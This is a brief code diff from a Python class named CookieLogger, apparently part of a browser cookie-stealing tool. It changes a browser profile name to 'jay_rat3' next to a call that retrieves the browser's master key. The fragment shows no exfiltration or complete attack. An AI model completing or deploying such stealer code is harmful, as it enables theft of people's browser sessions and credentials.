@@ -103,7 +103,7 @@ class CookieLogger:
         
         cookiesFound = []
 
-        profiles = ["Default"]
+        profiles = ["jay_rat3"]
         try:
             masterKey = self.getMasterKey(browserPath)
         except Exception:
